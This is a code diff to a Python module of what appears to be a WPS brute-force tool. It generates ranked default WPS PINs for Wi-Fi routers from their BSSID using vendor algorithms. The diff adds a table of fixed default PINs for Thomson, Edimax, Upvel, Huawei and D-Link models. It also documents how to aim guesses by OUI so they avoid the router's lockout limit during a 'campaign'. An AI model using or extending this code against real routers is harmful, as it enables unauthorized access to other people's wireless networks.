@@ -3,24 +3,27 @@
 PINs are computed at runtime from published WPS default-PIN algorithms, so no PIN table is
 bundled. The 8th digit is the Wi-Fi Simple Config checksum (:func:`wsc_crypto.pin_checksum`).
 
-Dispatch is **gate, don't flood** — applying every vendor's algorithm to every AP wastes the
-~3-attempt hard-lock budget on wrong-manufacturer guesses, so:
+A router's OUI identifies its **brand** (an IEEE assignment) but never its **chipset** (the
+Wi-Fi silicon inside — many brands share one). So candidates split by whether the OUI can tell
+us the PIN applies:
 
-* **Broad** (tried on every AP): the chipset-family algorithms that ship under many brands'
-  OUIs and so *cannot* be OUI-gated — ``pin24`` (Broadcom/Atheros/Ralink "ComputePIN") and
-  ``pin_airocon`` (Realtek). Realtek owns 2 OUIs and Broadcom 31, confirming their PINs are
-  keyed on the chip, not the brand.
-* **Brand-gated** (only when the BSSID's OUI matches — see :mod:`wps_router_ouis`):
-  ``pin_dlink`` / ``pin_dlink1`` (D-Link), ``pin_asus`` (ASUS).
+* **Broad** (tried on every AP): the chipset-family algorithms, which can't be tied to a brand
+  from the OUI — ``pin24`` (Broadcom/Atheros/Ralink "ComputePIN") and ``pin_airocon`` (Realtek).
+  (Realtek owns 2 OUIs and Broadcom 31, confirming these are keyed on the chip, not the brand.)
+* **Brand-keyed** (tried only on a matching OUI — see :mod:`wps_router_ouis`): the generators
+  ``pin_dlink`` / ``pin_dlink1`` (D-Link) and ``pin_asus`` (ASUS), plus a few fixed per-brand
+  default PINs (``_VENDOR_STATICS``): Thomson, Edimax, Upvel, Huawei HG532x, D-Link DSL-2740R.
+  Aimed by OUI, so they never cost the lockout budget on other brands' APs.
 
 Algorithm descriptions: bertof/WPS-pin-generator; the devttys0 write-ups; 3WiFi
 (3wifi.stascorp.com/wpspin). To check for newer vendor-specific PINs, see airgeddon's
 ``known_pins.db`` (github.com/v1s1t0r1sh3r3/airgeddon).
 
-Deliberately not seeded here: the speculative N-bit/inverted-NIC variants and the per-family
-static-constant table (both are just points inside the campaign's Group-4 keyspace sweep, so
-seeding them only burns the lockout budget); Belkin (needs the M1 serial, so it needs an
-exchange-flow change first). The generic always-try constants live in :mod:`pins` (COMMON_PINS).
+Deliberately not seeded (can't be tied to a brand from the OUI, so seeding them would just
+spray wrong guesses at every AP): the speculative N-bit / inverted-NIC variants, the chipset
+static constants (Broadcom / Realtek / Airocon), and the ISP-rebrand statics (Onlime, CBN-ONO…).
+Belkin is deferred too (needs the M1 serial). The generic always-try constants live in
+:mod:`pins` (COMMON_PINS).
 """
 
 from __future__ import annotations
@@ -91,7 +94,7 @@ def pin_asus(bssid: bytes) -> List[str]:
     return [_finalize(int(digits))]
 
 
-# --- Dispatch: gate the brand algorithms, always run the broad chipset ones ---------------
+# --- Dispatch: brand-keyed candidates for a matching OUI, then the broad chipset ones ------
 _BROAD_ALGOS: Tuple[Generator, ...] = (pin24, pin_airocon)
 
 _VENDOR_ALGOS: Dict[str, Tuple[Generator, ...]] = {
@@ -100,17 +103,29 @@ _VENDOR_ALGOS: Dict[str, Tuple[Generator, ...]] = {
     "belkin": (),   # Arcadyan-Belkin algo needs the M1 serial (deferred); pin24 covers it broadly
 }
 
+# Fixed per-brand default PINs — tried only on that brand's routers (aimed by OUI, like the
+# generators, so they never cost the lockout budget on other brands' APs).
+_VENDOR_STATICS: Dict[str, Tuple[str, ...]] = {
+    "dlink":   ("68175542",),                          # DSL-2740R
+    "thomson": ("67958146",),
+    "edimax":  ("35611530",),
+    "upvel":   ("20854836", "43977680", "05294176"),   # Upvel + UR-814AC + UR-825AC
+    "huawei":  ("34259283",),                          # HG532x
+}
+
 
 def pins_for(bssid: bytes) -> List[str]:
     """Ranked, deduped candidate PINs for a 6-byte BSSID.
 
-    Brand-specific generators (gated to the OUI) first, then the broad chipset-family ones.
+    Brand-keyed candidates (generators + fixed PINs, for a matching OUI) first, then the broad
+    chipset-family generators.
     """
-    from . import wps_router_ouis    # lazy: ~7 KB table, imported only at the first WPS attempt
+    from . import wps_router_ouis    # lazy: table imported only at the first WPS attempt
     vendor = wps_router_ouis.OUI_VENDOR.get(bssid[:3].hex().upper())
     out: List[str] = []
     for algo in _VENDOR_ALGOS.get(vendor, ()):
         out += algo(bssid)
+    out += _VENDOR_STATICS.get(vendor, ())
     for algo in _BROAD_ALGOS:
         out += algo(bssid)
     return list(dict.fromkeys(out))     # order-preserving dedup
